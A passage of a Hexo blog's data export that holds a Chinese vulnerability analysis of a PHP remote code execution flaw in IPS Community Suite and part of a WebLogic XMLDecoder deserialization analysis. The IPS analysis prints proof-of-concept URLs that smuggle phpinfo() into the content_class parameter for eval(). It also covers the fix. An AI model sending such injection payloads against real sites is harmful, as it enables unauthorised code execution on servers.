src=\"https://s2.ax1x.com/2020/01/02/lY2bRA.png\" alt=\"lY2bRA.png\"></p>\n<p>在调用processRequest方法时需要传入参数var1，var1为POST请求中传进来的XML数据，var1数据见下图</p>\n<p><img src=\"https://s2.ax1x.com/2020/01/02/lY25VO.png\" alt=\"lY25VO.png\"></p>\n<p>接着，程序将xml头部进行解析并赋值给var3，如果var3不为空，就进入readHeaderOld()方法，见下图</p>\n<p><img src=\"https://s2.ax1x.com/2020/01/02/lY2hqK.png\" alt=\"lY2hqK.png\"></p>\n<p>跟入readHeaderOld方法</p>\n<p><img src=\"https://s2.ax1x.com/2020/01/02/lY2DVU.png\" alt=\"lY2DVU.png\"></p>\n<p>可见readHeaderOld方法中使用如下红框中操作对缓存区数据进行处理</p>\n<p><img src=\"https://s2.ax1x.com/2020/01/02/lY2xZ8.png\" alt=\"lY2xZ8.png\"></p>\n<p>其中var4为poc中构造的payload代码</p>\n<p><img src=\"https://s2.ax1x.com/2020/01/02/lY22x1.png\" alt=\"lY22x1.png\"></p>\n<p>对应数据包中红框中数据</p>\n<p><img src=\"https://s2.ax1x.com/2020/01/02/lY2OMt.png\" alt=\"lY2OMt.png\"></p>\n<p>接着用var4创建WorkContextXmlInputAdapter类的对象 var6</p>\n<p><img src=\"https://s2.ax1x.com/2020/01/02/lY2jqf.png\" alt=\"lY2jqf.png\"></p>\n<p>我们看一下WorkContextXmlInputAdapter的实现，如下图</p>\n<p><img src=\"https://s2.ax1x.com/2020/01/02/lYRizn.png\" alt=\"lYRizn.png\"></p>\n<p>可见在该类的构造方法中，将传递进来的XML格式的序列化数据通过XMLDecoder来进行反序列化操作，并传递给this.xmlDecoder</p>\n<p>此时var6入下图所示</p>\n<p><img src=\"https://s2.ax1x.com/2020/01/02/lY2WKx.png\" alt=\"lY2WKx.png\"></p>\n<p>var6将被传入receive方法进行处理</p>\n<p>跟进receive方法</p>\n<p><img src=\"https://s2.ax1x.com/2020/01/02/lY2oIe.png\" alt=\"lY2oIe.png\"></p>\n<p>可见我们传入的payload被传入receiveRequest方法中，继续跟入receiveRequest方法</p>\n<p>receiveRequest方法</p>\n<p><img src=\"https://s2.ax1x.com/2020/01/02/lY20bT.png\" alt=\"lY20bT.png\"></p>\n<p>接着跟入receiveRequest方法中，见下图</p>\n<p><img src=\"https://s2.ax1x.com/2020/01/02/lY2g2R.png\" alt=\"lY2g2R.png\"></p>\n<p>可见receiveRequest方法调用了readEntry方法对传入的payload进行处理</p>\n<p>继续跟入readEntry方法</p>\n<p><img src=\"https://s2.ax1x.com/2020/01/02/lYRPRs.png\" alt=\"lYRPRs.png\"></p>\n<p>在readEntry方法中调用readUTF方法对payload进行处理</p>\n<p>跟入readUTF方法</p>\n<p><img src=\"https://s2.ax1x.com/2020/01/02/lY2qxI.png\" alt=\"lY2qxI.png\"></p>\n<p>readUTF方法中使用readObject对XMLDecoder对象进行了反序列化，从而导致了代码执行。这里的this.xmlDecoder即为我们传入的payload，见下图</p>\n<p><img src=\"https://s2.ax1x.com/2020/01/02/lY27PH.png\" alt=\"lY27PH.png\"></p>\n<p>至此，漏洞利用的这个流程分析完毕，可见构造的xml数据从请求中一路传递到漏洞触发点，在进行反序列化时被触发。关于payload的构造以及xmldecoder反序列化的相关知识，我会在下一篇文章中着重分析。</p>"},{"title":"早安！世界","date":"2017-05-17T14:22:36.000Z","_content":"一直以来想搭建一个自己的网站，然而又<font color=#FF7F50>不想花钱</font>。。。\n在寻找免费服务器的路上磕磕绊绊的，被国内外打着免费旗号的服务器坑的生活不能自理。\n猛地发现github上可以托管静态网站！！！效果还这么惊艳！！！\n顿时感慨自己没文化真可怕。。。\n总之，我的Blog杂货铺今天开张啦，按照惯例，向全世界问候一声~\n<div align=\"center\">\n{% asset_img helloworld.jpeg%}\n</div>\n","source":"_posts/Hello-World-0.md","raw":"---\ntitle: 早安！世界\ndate: 2017-05-17 22:22:36\ncategories: 日常\ntags: 杂文\n---\n一直以来想搭建一个自己的网站，然而又<font color=#FF7F50>不想花钱</font>。。。\n在寻找免费服务器的路上磕磕绊绊的，被国内外打着免费旗号的服务器坑的生活不能自理。\n猛地发现github上可以托管静态网站！！！效果还这么惊艳！！！\n顿时感慨自己没文化真可怕。。。\n总之，我的Blog杂货铺今天开张啦，按照惯例，向全世界问候一声~\n<div align=\"center\">\n{% asset_img helloworld.jpeg%}\n</div>\n","slug":"Hello-World-0","published":1,"updated":"2019-09-24T07:15:14.838Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ckgrozu8e000owsa90ynhfvm8","content":"<p>一直以来想搭建一个自己的网站，然而又<font color=#FF7F50>不想花钱</font>。。。<br>在寻找免费服务器的路上磕磕绊绊的，被国内外打着免费旗号的服务器坑的生活不能自理。<br>猛地发现github上可以托管静态网站！！！效果还这么惊艳！！！<br>顿时感慨自己没文化真可怕。。。<br>总之，我的Blog杂货铺今天开张啦，按照惯例，向全世界问候一声~</p>\n<div align=\"center\">\n<img src= \"/img/loading.gif\" data-lazy-src=\"/Hello-World-0/helloworld.jpeg\" class=\"\">\n</div>\n","site":{"data":{"link":[{"class_name":"友情鏈接","class_desc":"那些人，那些事","link_list":[{"name":"xxlegend","link":"http://xxlegend.com/","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/xxlegend.png"},{"name":"phithon","link":"https://www.leavesongs.com","avatar":"https://secure.gravatar.com/avatar/c4267eb6d17276fa31c547ac71611e90.jpg?s=100&d=mm&r=g"},{"name":"ADOG","link":"http://foreversong.cn/","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/微信图片_20200916153556.jpg"},{"name":"kylingit","link":"https://kylingit.com","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/logo.jpg"},{"name":"tsang","link":"https://jontsang.github.io","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/avatar.png"},{"name":"BlBana","link":"https://drops.blbana.cc","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/Misaka.jpg"},{"name":"ChaBug安全","link":"http://www.chabug.org","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/微信截图_20200918105651.png"}]}]}},"cover":"http://blog.nsfocus.net/wp-content/uploads/2020/08/image-237-570x456.png","excerpt":"","more":"<p>一直以来想搭建一个自己的网站，然而又<font color=#FF7F50>不想花钱</font>。。。<br>在寻找免费服务器的路上磕磕绊绊的，被国内外打着免费旗号的服务器坑的生活不能自理。<br>猛地发现github上可以托管静态网站！！！效果还这么惊艳！！！<br>顿时感慨自己没文化真可怕。。。<br>总之，我的Blog杂货铺今天开张啦，按照惯例，向全世界问候一声~</p>\n<div align=\"center\">\n<img src=\"/Hello-World-0/helloworld.jpeg\" class=\"\">\n</div>\n"},{"title":"IPS Community Suite PHP远程代码执行漏洞分析","date":"2017-11-02T06:35:31.000Z","top_img":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/php.jpg","_content":"\n\"IPS Community Suite \"是一款在国外广泛使用的建站系统。近期被曝出在4.1.12.3版本及以下版本存在代码注入漏洞。这个漏洞通过控制content_class参数提交的请求来注入代码，以至于可以远程执行PHP代码。\n\n<!--more-->\n\n### 影响版本\n\nIPS版本：&lt;=4.1.12.3\n\n### 漏洞分析\n\n根据纰漏的漏洞细节，可以分析出这次漏洞的问题在于content_class这个参数。经过在源文件中搜索，发现这个参数在/applications/core/modules/front/system/content.php文件中被使用。、\n\n[![ips-community-suite1](http://blog.nsfocus.net/wp-content/uploads/2016/11/IPS-Community-Suite1-300x90.jpg)](http://blog.nsfocus.net/wp-content/uploads/2016/11/IPS-Community-Suite1.jpg)\n\n在content.php文件中的find()函数里，IPSRequest::i()-&gt;content_class方法获取了GET提交的content_class参数，然后通过explode函数与implode函数进行字符串分割与拼接的处理，最后组合’IPS&#92;’字段赋值给$class。\n\n我们接着看下一行的if语句：$class的值将传递到class_exists()函数中去，我们在这里简单的的介绍下class_exists()函数：\n\n<pre class=\"lang:default decode:true \">bool class_exists ( string $class_name [, bool $autoload = true ] );</pre>\n\nclass_exists()函数是用来检查类是否已定义。它有两个参数，我们平时用这个方法的时候大都只给了第一个参数，第二个参数的默认值是默认为true，当不去设置第二个参数时，会去默认调用__autoload方法去加载类。\n\n既然调用了__autoload方法，那不得不提到spl_autoload_register函数，这个方法会注册给定的函数作为 __autoload 的实现。 它实际上创建了 autoload 函数的队列，按定义时的顺序逐个执行。相比之下， [__autoload()](http://php.net/manual/zh/function.autoload.php) 只可以定义一次。\n\n接下来我们查看/applications/cms/Application.php 文件中的  spl_autoload_register() 函数，这个函数会被class_exists ()函数默认调用。\n\n[![ips-community-suite2](http://blog.nsfocus.net/wp-content/uploads/2016/11/IPS-Community-Suite2-300x147.jpg)](http://blog.nsfocus.net/wp-content/uploads/2016/11/IPS-Community-Suite2.jpg)\n\n在spl_autoload_register() 函数中，我们发现有如下几行代码：\n\n[![ips-community-suite3](http://blog.nsfocus.net/wp-content/uploads/2016/11/IPS-Community-Suite3-300x97.jpg)](http://blog.nsfocus.net/wp-content/uploads/2016/11/IPS-Community-Suite3.jpg)\n\n前文content.php文件中的$class变量将通过如下两个if判断，我们接下来看看if里的内容，发现了$class变量的值经过处理后在eval()函数中可以被执行，初步判定代码执行漏洞在这里被触发。\n\n因为两处触发点原理相同，我们就以第一处详细讲解：\n\n[![ips-community-suite4](http://blog.nsfocus.net/wp-content/uploads/2016/11/IPS-Community-Suite4-300x60.jpg)](http://blog.nsfocus.net/wp-content/uploads/2016/11/IPS-Community-Suite4.jpg)\n\n如图所示，如果想顺利的进入if语句中，我们需要使$class变量前十四个字符串内容为’IPS\\cms\\Fields’;并且使第十五处字符为数字类型。\n\n绕过判定后，$class变量中第十四个字符以后所有的字符将赋值给$databaseId变量，而$databaseId变量中的PHP函数将会被eval执行，这样远程代码执行漏洞就会被触发。\n\n### <span style=\"font-size: large;\"><span style=\"color: #000000;\"><span style=\"font-family: 宋体;\">漏洞利用</span></span></span>\n\n我们分析下这个漏洞如何来利用，已知$class变量的值是通过content.php文件中的如下语句传递的：\n\n[![ips-community-suite5](http://blog.nsfocus.net/wp-content/uploads/2016/11/IPS-Community-Suite5-300x16.jpg)](http://blog.nsfocus.net/wp-content/uploads/2016/11/IPS-Community-Suite5.jpg)\n\n在这里content_class值是可以通过GET提交控制的，所以我们提交如下content_class参数content_class=cms\\Fields1{}phpinfo();/*\n\n经过处理后的$class值如下：\n\n&nbsp;\n\n[![ips-community-suite6](http://blog.nsfocus.net/wp-content/uploads/2016/11/IPS-Community-Suite6-300x9.jpg)](http://blog.nsfocus.net/wp-content/uploads/2016/11/IPS-Community-Suite6.jpg)\n\n在/applications/cms/Application.php 文件中，$class的值顺利的绕过判定，进入if语句中去，此时的$databaseId变量值为\n\n[![ips-community-suite7](http://blog.nsfocus.net/wp-content/uploads/2016/11/IPS-Community-Suite7-300x12.jpg)](http://blog.nsfocus.net/wp-content/uploads/2016/11/IPS-Community-Suite7.jpg)\n\n传入eval()中被执行。\n\nPoc：\n\nhttp://[host]/[ips]/index.php?app=core&amp;module=system&amp;controller=content&amp;do=find&amp;content_class=cms\\Fields1{}phpinfo();/*\n\nhttp://[host]/[ips]/index.php?app=core&amp;module=system&amp;controller=content&amp;do=find&amp;content_class= cms\\extensions\\core\\EditorLocations\\Records1{}phpinfo();/*\n\n执行结果：\n\nPoc执行后页面显示如下结果，和预期结果并不相同，\n\n[caption id=\"attachment_5641\" align=\"aligncenter\" width=\"300\"][![IPS Community Suite8](http://blog.nsfocus.net/wp-content/uploads/2016/11/IPS-Community-Suite8-300x137.jpg)](http://blog.nsfocus.net/wp-content/uploads/2016/11/IPS-Community-Suite8.jpg) IPS Community Suite8[/caption]\n\n我们接下来看一下抓包，发现返回的响应包中有三部分内容，第一部分为PHP报错信息，第二部分为phpinfo，而第三部分为原来/applications/core/modules/front/system/content.php中红框里代码执行后的结果：\n\n[![ips-community-suite9](http://blog.nsfocus.net/wp-content/uploads/2016/11/IPS-Community-Suite9-300x27.jpg)](http://blog.nsfocus.net/wp-content/uploads/2016/11/IPS-Community-Suite9.jpg)\n\n上图红框里代码的作用是返回一个404页面，它正常执行后返回页面应如下图所示：\n\n[![ips-community-suite10](http://blog.nsfocus.net/wp-content/uploads/2016/11/IPS-Community-Suite10-300x130.jpg)](http://blog.nsfocus.net/wp-content/uploads/2016/11/IPS-Community-Suite10.jpg)\n\n这三部分数据如下图所示：\n\n[![ips-community-suite11](http://blog.nsfocus.net/wp-content/uploads/2016/11/IPS-Community-Suite11-279x300.jpg)](http://blog.nsfocus.net/wp-content/uploads/2016/11/IPS-Community-Suite11.jpg)\n\n由于这三个部分同时被服务器返回，前两部分为明文，而第三部分采用gzip压缩，导致浏览器显示内容编码错误，无法显示，但phpinfo()函数实际上被执行。\n\n为了使验证结果更明显，我们将/applications/core/modules/front/system/content.php中的404返回信息注释掉，如下图所示。\n\n[![ips-community-suite12](http://blog.nsfocus.net/wp-content/uploads/2016/11/IPS-Community-Suite12-300x34.jpg)](http://blog.nsfocus.net/wp-content/uploads/2016/11/IPS-Community-Suite12.jpg)\n\n让第三部分404页面信息不返回，再次发送poc请求，结果如下图所示：\n\n[![ips-community-suite13](http://blog.nsfocus.net/wp-content/uploads/2016/11/IPS-Community-Suite13-300x225.jpg)](http://blog.nsfocus.net/wp-content/uploads/2016/11/IPS-Community-Suite13.jpg)\n\n### 官方修复分析\n\n经过对比分析：\n\n发现Application.php这个文件中原来的 spl_autoload_register() 和更新后\n\n[![ips-community-suite14](http://blog.nsfocus.net/wp-content/uploads/2016/11/IPS-Community-Suite14-300x225.jpg)](http://blog.nsfocus.net/wp-content/uploads/2016/11/IPS-Community-Suite14.jpg)\n\n通过对比可以看出，这次漏洞修复是使用 intval() 函数进一步对mb_substr()函数的返回值进行来整数验证。使得$databaseId的值必须为一个整数，这样防止了eval()执行传入的PHP代码。\n\n### 漏洞修复\n\n1.  PHP  5.4.x  升级至 5.4.25 以上， 5.5.x 升级至 5.5.9 以上\n2.  IPS 升级至`4.12.3.1 以上\n\n如果您需要了解更多内容，可以\n加入QQ群：570982169、486207500\n直接询问：010-68438880-8669","source":"_posts/IPS-Community-Suite-PHP-RCE.md","raw":"---\ntitle: IPS Community Suite PHP远程代码执行漏洞分析\ndate: 2017-11-2 14:35:31\ntags: web漏洞分析\ncategories: 技术\n\ntop_img: https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/php.jpg\n---\n\n\"IPS Community Suite \"是一款在国外广泛使用的建站系统。近期被曝出在4.1.12.3版本及以下版本存在代码注入漏洞。这个漏洞通过控制content_class参数提交的请求来注入代码，以至于可以远程执行PHP代码。\n\n<!--more-->\n\n### 影响版本\n\nIPS版本：&lt;=4.1.12.3\n\n### 漏洞分析\n\n根据纰漏的漏洞细节，可以分析出这次漏洞的问题在于content_class这个参数。经过在源文件中搜索，发现这个参数在/applications/core/modules/front/system/content.php文件中被使用。、\n\n[![ips-community-suite1](http://blog.nsfocus.net/wp-content/uploads/2016/11/IPS-Community-Suite1-300x90.jpg)](http://blog.nsfocus.net/wp-content/uploads/2016/11/IPS-Community-Suite1.jpg)\n\n在content.php文件中的find()函数里，IPSRequest::i()-&gt;content_class方法获取了GET提交的content_class参数，然后通过explode函数与implode函数进行字符串分割与拼接的处理，最后组合’IPS&#92;’字段赋值给$class。\n\n我们接着看下一行的if语句：$class的值将传递到class_exists()函数中去，我们在这里简单的的介绍下class_exists()函数：\n\n<pre class=\"lang:default decode:true \">bool class_exists ( string $class_name [, bool $autoload = true ] );</pre>\n\nclass_exists()函数是用来检查类是否已定义。它有两个参数，我们平时用这个方法的时候大都只给了第一个参数，第二个参数的默认值是默认为true，当不去设置第二个参数时，会去默认调用__autoload方法去加载类。\n\n既然调用了__autoload方法，那不得不提到spl_autoload_register函数，这个方法会注册给定的函数作为 __autoload 的实现。 它实际上创建了 autoload 函数的队列，按定义时的顺序逐个执行。相比之下， [__autoload()](http://php.net/manual/zh/function.autoload.php) 只可以定义一次。\n\n接下来我们查看/applications/cms/Application.php 文件中的  spl_autoload_register() 函数，这个函数会被class_exists ()函数默认调用。\n\n[![ips-community-suite2](http://blog.nsfocus.net/wp-content/uploads/2016/11/IPS-Community-Suite2-300x147.jpg)](http://blog.nsfocus.net/wp-content/uploads/2016/11/IPS-Community-Suite2.jpg)\n\n在spl_autoload_register() 函数中，我们发现有如下几行代码：\n\n[![ips-community-suite3](http://blog.nsfocus.net/wp-content/uploads/2016/11/IPS-Community-Suite3-300x97.jpg)](http://blog.nsfocus.net/wp-content/uploads/2016/11/IPS-Community-Suite3.jpg)\n\n前文content.php文件中的$class变量将通过如下两个if判断，我们接下来看看if里的内容，发现了$class变量的值经过处理后在eval()函数中可以被执行，初步判定代码执行漏洞在这里被触发。\n\n因为两处触发点原理相同，我们就以第一处详细讲解：\n\n[![ips-community-suite4](http://blog.nsfocus.net/wp-content/uploads/2016/11/IPS-Community-Suite4-300x60.jpg)](http://blog.nsfocus.net/wp-content/uploads/2016/11/IPS-Community-Suite4.jpg)\n\n如图所示，如果想顺利的进入if语句中，我们需要使$class变量前十四个字符串内容为’IPS\\cms\\Fields’;并且使第十五处字符为数字类型。\n\n绕过判定后，$class变量中第十四个字符以后所有的字符将赋值给$databaseId变量，而$databaseId变量中的PHP函数将会被eval执行，这样远程代码执行漏洞就会被触发。\n\n### <span style=\"font-size: large;\"><span style=\"color: #000000;\"><span style=\"font-family: 宋体;\">漏洞利用</span></span></span>\n\n我们分析下这个漏洞如何来利用，已知$class变量的值是通过content.php文件中的如下语句传递的：\n\n[![ips-community-suite5](http://blog.nsfocus.net/wp-content/uploads/2016/11/IPS-Community-Suite5-300x16.jpg)](http://blog.nsfocus.net/wp-content/uploads/2016/11/IPS-Community-Suite5.jpg)\n\n在这里content_class值是可以通过GET提交控制的，所以我们提交如下content_class参数content_class=cms\\Fields1{}phpinfo();/*\n\n经过处理后的$class值如下：\n\n&nbsp;\n\n[![ips-community-suite6](http://blog.nsfocus.net/wp-content/uploads/2016/11/IPS-Community-Suite6-300x9.jpg)](http://blog.nsfocus.net/wp-content/uploads/2016/11/IPS-Community-Suite6.jpg)\n\n在/applications/cms/Application.php 文件中，$class的值顺利的绕过判定，进入if语句中去，此时的$databaseId变量值为\n\n[![ips-community-suite7](http://blog.nsfocus.net/wp-content/uploads/2016/11/IPS-Community-Suite7-300x12.jpg)](http://blog.nsfocus.net/wp-content/uploads/2016/11/IPS-Community-Suite7.jpg)\n\n传入eval()中被执行。\n\nPoc：\n\nhttp://[host]/[ips]/index.php?app=core&amp;module=system&amp;controller=content&amp;do=find&amp;content_class=cms\\Fields1{}phpinfo();/*\n\nhttp://[host]/[ips]/index.php?app=core&amp;module=system&amp;controller=content&amp;do=find&amp;content_class= cms\\extensions\\core\\EditorLocations\\Records1{}phpinfo();/*\n\n执行结果：\n\nPoc执行后页面显示如下结果，和预期结果并不相同，\n\n[caption id=\"attachment_5641\" align=\"aligncenter\" width=\"300\"][![IPS Community Suite8](http://blog.nsfocus.net/wp-content/uploads/2016/11/IPS-Community-Suite8-300x137.jpg)](http://blog.nsfocus.net/wp-content/uploads/2016/11/IPS-Community-Suite8.jpg) IPS Community Suite8[/caption]\n\n我们接下来看一下抓包，发现返回的响应包中有三部分内容，第一部分为PHP报错信息，第二部分为phpinfo，而第三部分为原来/applications/core/modules/front/system/content.php中红框里代码执行后的结果：\n\n[![ips-community-suite9](http://blog.nsfocus.net/wp-content/uploads/2016/11/IPS-Community-Suite9-300x27.jpg)](http://blog.nsfocus.net/wp-content/uploads/2016/11/IPS-Community-Suite9.jpg)\n\n上图红框里代码的作用是返回一个404页面，它正常执行后返回页面应如下图所示：\n\n[![ips-community-suite10](http://blog.nsfocus.net/wp-content/uploads/2016/11/IPS-Community-Suite10-300x130.jpg)](http://blog.nsfocus.net/wp-content/uploads/2016/11/IPS-Community-Suite10.jpg)\n\n这三部分数据如下图所示：\n\n[![ips-community-suite11](http://blog.nsfocus.net/wp-content/uploads/2016/11/IPS-Community-Suite11-279x300.jpg)](http://blog.nsfocus.net/wp-content/uploads/2016/11/IPS-Community-Suite11.jpg)\n\n由于这三个部分同时被服务器返回，前两部分为明文，而第三部分采用gzip压缩，导致浏览器显示内容编码错误，无法显示，但phpinfo()函数实际上被执行。\n\n为了使验证结果更明显，我们将/applications/core/modules/front/system/content.php中的404返回信息注释掉，如下图所示。\n\n[![ips-community-suite12](http://blog.nsfocus.net/wp-content/uploads/2016/11/IPS-Community-Suite12-300x34.jpg)](http://blog.nsfocus.net/wp-content/uploads/2016/11/IPS-Community-Suite12.jpg)\n\n让第三部分404页面信息不返回，再次发送poc请求，结果如下图所示：\n\n[![ips-community-suite13](http://blog.nsfocus.net/wp-content/uploads/2016/11/IPS-Community-Suite13-300x225.jpg)](http://blog.nsfocus.net/wp-content/uploads/2016/11/IPS-Community-Suite13.jpg)\n\n### 官方修复分析\n\n经过对比分析：\n\n发现Application.php这个文件中原来的 spl_autoload_register() 和更新后\n\n[![ips-community-suite14](http://blog.nsfocus.net/wp-content/uploads/2016/11/IPS-Community-Suite14-300x225.jpg)](http://blog.nsfocus.net/wp-content/uploads/2016/11/IPS-Community-Suite14.jpg)\n\n通过对比可以看出，这次漏洞修复是使用 intval() 函数进一步对mb_substr()函数的返回值进行来整数验证。使得$databaseId的值必须为一个整数，这样防止了eval()执行传入的PHP代码。\n\n### 漏洞修复\n\n1.  PHP  5.4.x  升级至 5.4.25 以上， 5.5.x 升级至 5.5.9 以上\n2.  IPS 升级至`4.12.3.1 以上\n\n如果您需要了解更多内容，可以\n加入QQ群：570982169、486207500\n直接询问：010-68438880-8669","slug":"IPS-Community-Suite-PHP-RCE","published":1,"updated":"2020-10-27T09:27:09.601Z","_id":"ckgrozu8g000rwsa9dxt55jsd","comments":1,"layout":"post","photos":[],"link":"","content":"<p>“IPS Community Suite “是一款在国外广泛使用的建站系统。近期被曝出在4.1.12.3版本及以下版本存在代码注入漏洞。这个漏洞通过控制content_class参数提交的请求来注入代码，以至于可以远程执行PHP代码。</p>\n<a id=\"more\"></a>\n\n<h3 id=\"影响版本\"><a href=\"#影响版本\" class=\"headerlink\" title=\"影响版本\"></a>影响版本</h3><p>IPS版本：&lt;=4.1.12.3</p>\n<h3 id=\"漏洞分析\"><a href=\"#漏洞分析\" class=\"headerlink\" title=\"漏洞分析\"></a>漏洞分析</h3><p>根据纰漏的漏洞细节，可以分析出这次漏洞的问题在于content_class这个参数。经过在源文件中搜索，发现这个参数在/applications/core/modules/front/system/content.php文件中被使用。、</p>\n<p><a href=\"http://blog.nsfocus.net/wp-content/uploads/2016/11/IPS-Community-Suite1.jpg\"><img src= \"/img/loading.gif\" data-lazy-src=\"http://blog.nsfocus.net/wp-content/uploads/2016/11/IPS-Community-Suite1-300x90.jpg\" alt=\"ips-community-suite1\"></a></p>\n<p>在content.php文件中的find()函数里，IPSRequest::i()-&gt;content_class方法获取了GET提交的content_class参数，然后通过explode函数与implode函数进行字符串分割与拼接的处理，最后组合’IPS&#92;’字段赋值给$class。</p>\n<p>我们接着看下一行的if语句：$class的值将传递到class_exists()函数中去，我们在这里简单的的介绍下class_exists()函数：</p>\n<pre class=\"lang:default decode:true \">bool class_exists ( string $class_name [, bool $autoload = true ] );</pre>\n\n<p>class_exists()函数是用来检查类是否已定义。它有两个参数，我们平时用这个方法的时候大都只给了第一个参数，第二个参数的默认值是默认为true，当不去设置第二个参数时，会去默认调用__autoload方法去加载类。</p>\n<p>既然调用了__autoload方法，那不得不提到spl_autoload_register函数，这个方法会注册给定的函数作为 __autoload 的实现。 它实际上创建了 autoload 函数的队列，按定义时的顺序逐个执行。相比之下， <a href=\"http://php.net/manual/zh/function.autoload.php\">__autoload()</a> 只可以定义一次。</p>\n<p>接下来我们查看/applications/cms/Application.php 文件中的  spl_autoload_register() 函数，这个函数会被class_exists ()函数默认调用。</p>\n<p><a href=\"http://blog.nsfocus.net/wp-content/uploads/2016/11/IPS-Community-Suite2.jpg\"><img src= \"/img/loading.gif\" data-lazy-src=\"http://blog.nsfocus.net/wp-content/uploads/2016/11/IPS-Community-Suite2-300x147.jpg\" alt=\"ips-community-suite2\"></a></p>\n<p>在spl_autoload_register() 函数中，我们发现有如下几行代码：</p>\n<p><a href=\"http://blog.nsfocus.net/wp-content/uploads/2016/11/IPS-Community-Suite3.jpg\"><img src= \"/img/loading.gif\" data-lazy-src=\"http://blog.nsfocus.net/wp-content/uploads/2016/11/IPS-Community-Suite3-300x97.jpg\" alt=\"ips-community-suite3\"></a></p>\n<p>前文content.php文件中的$class变量将通过如下两个if判断，我们接下来看看if里的内容，发现了$class变量的值经过处理后在eval()函数中可以被执行，初步判定代码执行漏洞在这里被触发。</p>\n<p>因为两处触发点原理相同，我们就以第一处详细讲解：</p>\n<p><a href=\"http://blog.nsfocus.net/wp-content/uploads/2016/11/IPS-Community-Suite4.jpg\"><img src= \"/img/loading.gif\" data-lazy-src=\"http://blog.nsfocus.net/wp-content/uploads/2016/11/IPS-Community-Suite4-300x60.jpg\" alt=\"ips-community-suite4\"></a></p>\n<p>如图所示，如果想顺利的进入if语句中，我们需要使$class变量前十四个字符串内容为’IPS\\cms\\Fields’;并且使第十五处字符为数字类型。</p>\n<p>绕过判定后，$class变量中第十四个字符以后所有的字符将赋值给$databaseId变量，而$databaseId变量中的PHP函数将会被eval执行，这样远程代码执行漏洞就会被触发。</p>\n<h3 id=\"漏洞利用\"><a href=\"#漏洞利用\" class=\"headerlink\" title=\"漏洞利用\"></a><span style=\"font-size: large;\"><span style=\"color: #000000;\"><span style=\"font-family: 宋体;\">漏洞利用</span></span></span></h3><p>我们分析下这个漏洞如何来利用，已知$class变量的值是通过content.php文件中的如下语句传递的：</p>\n<p><a href=\"http://blog.nsfocus.net/wp-content/uploads/2016/11/IPS-Community-Suite5.jpg\"><img src= \"/img/loading.gif\" data-lazy-src=\"http://blog.nsfocus.net/wp-content/uploads/2016/11/IPS-Community-Suite5-300x16.jpg\" alt=\"ips-community-suite5\"></a></p>\n<p>在这里content_class值是可以通过GET提交控制的，所以我们提交如下content_class参数content_class=cms\\Fields1{}phpinfo();/*</p>\n<p>经过处理后的$class值如下：</p>\n<p>&nbsp;</p>\n<p><a href=\"http://blog.nsfocus.net/wp-content/uploads/2016/11/IPS-Community-Suite6.jpg\"><img src= \"/img/loading.gif\" data-lazy-src=\"http://blog.nsfocus.net/wp-content/uploads/2016/11/IPS-Community-Suite6-300x9.jpg\" alt=\"ips-community-suite6\"></a></p>\n<p>在/applications/cms/Application.php 文件中，$class的值顺利的绕过判定，进入if语句中去，此时的$databaseId变量值为</p>\n<p><a href=\"http://blog.nsfocus.net/wp-content/uploads/2016/11/IPS-Community-Suite7.jpg\"><img src= \"/img/loading.gif\" data-lazy-src=\"http://blog.nsfocus.net/wp-content/uploads/2016/11/IPS-Community-Suite7-300x12.jpg\" alt=\"ips-community-suite7\"></a></p>\n<p>传入eval()中被执行。</p>\n<p>Poc：</p>\n<p>http://[host]/[ips]/index.php?app=core&amp;module=system&amp;controller=content&amp;do=find&amp;content_class=cms\\Fields1{}phpinfo();/*</p>\n<p>http://[host]/[ips]/index.php?app=core&amp;module=system&amp;controller=content&amp;do=find&amp;content_class= cms\\extensions\\core\\EditorLocations\\Records1{}phpinfo();/*</p>\n<p>执行结果：</p>\n<p>Poc执行后页面显示如下结果，和预期结果并不相同，</p>\n<p>[caption id=”attachment_5641” align=”aligncenter” width=”300”]<a href=\"http://blog.nsfocus.net/wp-content/uploads/2016/11/IPS-Community-Suite8.jpg\"><img src= \"/img/loading.gif\" data-lazy-src=\"http://blog.nsfocus.net/wp-content/uploads/2016/11/IPS-Community-Suite8-300x137.jpg\" alt=\"IPS Community Suite8\"></a> IPS Community Suite8[/caption]</p>\n<p>我们接下来看一下抓包，发现返回的响应包中有三部分内容，第一部分为PHP报错信息，第二部分为phpinfo，而第三部分为原来/applications/core/modules/front/system/content.php中红框里代码执行后的结果：</p>\n<p><a href=\"http://blog.nsfocus.net/wp-content/uploads/2016/11/IPS-Community-Suite9.jpg\"><img src= \"/img/loading.gif\" data-lazy-src=\"http://blog.nsfocus.net/wp-content/uploads/2016/11/IPS-Community-Suite9-300x27.jpg\" alt=\"ips-community-suite9\"></a></p>\n<p>上图红框里代码的作用是返回一个404页面，它正常执行后返回页面应如下图所示：</p>\n<p><a href=\"http://blog.nsfocus.net/wp-content/uploads/2016/11/IPS-Community-Suite10.jpg\"><img src= \"/img/loading.gif\" data-lazy-src=\"http://blog.nsfocus.net/wp-content/uploads/2016/11/IPS-Community-Suite10-300x130.jpg\" alt=\"ips-community-suite10\"></a></p>\n<p>这三部分数据如下图所示：</p>\n<p><a href=\"http://blog.nsfocus.net/wp-content/uploads/2016/11/IPS-Community-Suite11.jpg\"><img src= \"/img/loading.gif\" data-lazy-src=\"http://blog.nsfocus.net/wp-content/uploads/2016/11/IPS-Community-Suite11-279x300.jpg\" alt=\"ips-community-suite11\"></a></p>\n<p>由于这三个部分同时被服务器返回，前两部分为明文，而第三部分采用gzip压缩，导致浏览器显示内容编码错误，无法显示，但phpinfo()函数实际上被执行。</p>\n<p>为了使验证结果更明显，我们将/applications/core/modules/front/system/content.php中的404返回信息注释掉，如下图所示。</p>\n<p><a href=\"http://blog.nsfocus.net/wp-content/uploads/2016/11/IPS-Community-Suite12.jpg\"><img src= \"/img/loading.gif\" data-lazy-src=\"http://blog.nsfocus.net/wp-content/uploads/2016/11/IPS-Community-Suite12-300x34.jpg\" alt=\"ips-community-suite12\"></a></p>\n<p>让第三部分404页面信息不返回，再次发送poc请求，结果如下图所示：</p>\n<p><a 